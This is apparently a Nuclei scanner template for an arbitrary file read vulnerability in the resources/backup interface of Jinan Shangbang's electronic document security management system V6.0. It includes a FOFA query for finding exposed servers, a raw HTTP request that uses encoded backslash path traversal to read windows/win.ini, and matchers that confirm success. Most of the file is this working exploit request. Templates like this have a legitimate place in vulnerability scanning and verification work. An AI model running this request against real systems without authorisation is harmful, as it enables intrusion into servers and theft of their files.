id: shangbang-dms-v6-backup-file-download

info:
  name: "济南上邦电子文档安全管理系统 V6.0 resources 接口任意文件读取漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="docsafe/docsafe.nocache.js"
      济南上邦电子科技有限公司电子文档安全管理系统 V6.0 的 resources/backup 接口存在任意文件读取缺陷，攻击者可利用此漏洞读取服务器上的任意文件内容
  tags: 济南上邦电子文档安全管理系统

http:
- raw:
  - |
    GET /resources/backup//..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cwindows/win.ini HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: keep-alive
  matchers-condition: and
  matchers:
  - type: status
    status: [200]
  - type: word
    part: body
    words:
    - "for 16-bit app support"
